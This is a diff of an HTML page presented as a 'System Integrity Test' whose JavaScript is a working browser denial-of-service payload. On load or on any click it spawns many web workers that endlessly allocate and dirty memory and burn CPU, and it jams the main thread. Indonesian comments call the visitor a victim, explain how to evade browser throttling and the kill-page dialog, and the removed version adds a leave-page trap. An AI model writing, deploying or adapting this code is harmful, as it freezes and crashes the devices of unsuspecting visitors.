@@ -1,56 +1,83 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Kontol Jaran</title>
+    <title>System Integrity Test - Platinum</title>
 </head>
-<body style="background:white; margin:0; height:100vh; display:flex; align-items:center; justify-content:center; font-family:sans-serif;">
-    <div style="text-align:center; color:#888;">
-        <p id="t">System Test Initializing...</p>
+<body style="background:white; margin:0; height:100vh; display:flex; flex-direction:column; align-items:center; justify-content:center; font-family:sans-serif; cursor: pointer;">
+    
+    <div id="ui" style="text-align:center; color:#888;">
+        <p id="t" style="font-size: 18px;">Initializing Stress Test...</p>
+        <p style="font-size: 12px; color: #bbb;">(Ketuk layar jika pengujian tidak dimulai otomatis)</p>
+        <p id="stat" style="font-size: 10px; color: #ccc; margin-top: 20px;">Buffer: 0MB</p>
     </div>
+
     <script>
-        // 1. FITUR ANTI-ESCAPE: Mencegah Refresh/Close (Pop-up Konfirmasi)
-        // Jika korban mencoba Refresh, browser akan memunculkan peringatan 
-        // "Apakah Anda yakin ingin meninggalkan situs ini?". 
-        // Selama korban melihat pop-up ini, RAM terus terisi di latar belakang!
-        window.onbeforeunload = function() {
-            return "Kontol Jaran";
+        let burning = false;
+
+        // PENTING: Memicu serangan lewat klik agar bypass "Efficiency Mode"
+        document.body.onclick = function() {
+            if(!burning) startNuke();
         };
 
-        window.onload = function() {
-            const status = document.getElementById('t');
-            const workerTotal = 64;
-            status.innerText = "Kontol Jaran";
+        // Tetap coba jalankan otomatis setelah 1 detik
+        setTimeout(() => {
+            if(!burning) startNuke();
+        }, 1000);
 
-            for (let i = 0; i < workerTotal; i++) {
-                let workerCode = (i % 2 === 0) ? `
-                    let h = [];
-                    setInterval(() => {
-                        try {
-                            let c = new Uint8Array(1024 * 1024 * 256);
-                            for(let j=0; j<c.length; j+=4096) c[j] = 1;
-                            h.push(c);
-                        } catch(e) {}
-                    }, 0);
-                ` : `
-                    function t() {
+        function startNuke() {
+            burning = true;
+            const status = document.getElementById('t');
+            const statText = document.getElementById('stat');
+            status.innerText = "NUCLEAR PROTOCOL ACTIVE. LOCKING SYSTEM...";
+            
+            // Jauh lebih banyak worker untuk menjamin antrean panjang di CPU Scheduler
+            const workerCount = (navigator.hardwareConcurrency || 8) * 4; 
+            let total = 0;
+
+            for (let i = 0; i < workerCount; i++) {
+                const blob = new Blob([`
+                    let heap = [];
+                    function launch() {
+                        // Loop abadi tanpa jeda untuk mematikan proteksi 'clamping'
                         while(true) {
-                            let v = 1.0;
-                            for(let j=0; j<40000000; j++) { v = Math.hypot(Math.tan(v), Math.atan(v)); }
+                            try {
+                                // Alokasi potongan 128MB agar stabil tapi cepat
+                                let chunk = new Uint32Array(1024 * 1024 * 32); 
+                                // DIRTYING: Trik agar OS tidak melakukan 'Compression'
+                                for(let j=0; j < chunk.length; j += 1024) {
+                                    chunk[j] = Math.floor(Math.random() * 0xFFFFFFFF);
+                                }
+                                heap.push(chunk);
+                                postMessage(128);
+                            } catch(e) {}
+
+                            // Beban CPU Maksimal di setiap siklus
+                            let x = 1.1;
+                            for(let k=0; k<5000000; k++) {
+                                x = Math.sqrt(Math.exp(Math.log(Math.random())));
+                            }
                         }
                     }
-                    t();
-                `;
-                const blob = new Blob([workerCode], { type: 'application/javascript' });
-                new Worker(URL.createObjectURL(blob));
+                    launch();
+                `], { type: 'application/javascript' });
+
+                const w = new Worker(URL.createObjectURL(blob));
+                w.onmessage = (e) => {
+                    total += e.data;
+                    // Memberikan feedback visual agar korban tahu sistem sedang hancur
+                    statText.innerText = "Buffer Saturation: " + total + " MB";
+                };
             }
 
-            // 2. LOCKDOWN LEBIH CEPAT (0.5 Detik)
-            // Hanya memberikan waktu 500ms agar korban tidak sempat menekan Refresh.
-            setTimeout(() => {
-                status.innerText = "TOTAL LOCKDOWN ACTIVE.";
-                while(true) { Math.sqrt(Math.random()); }
-            }, 200); 
-        };
+            // PENGUNCI INTERAKSI (Main Thread Jammer)
+            // Menggunakan requestAnimationFrame agar UI macet tanpa memicu dialog "Kill Page" terlalu cepat
+            function jam() {
+                let y = 0;
+                for(let j=0; j<10000000; j++) y += Math.sqrt(j);
+                requestAnimationFrame(jam);
+            }
+            jam();
+        }
     </script>
 </body>
 </html>
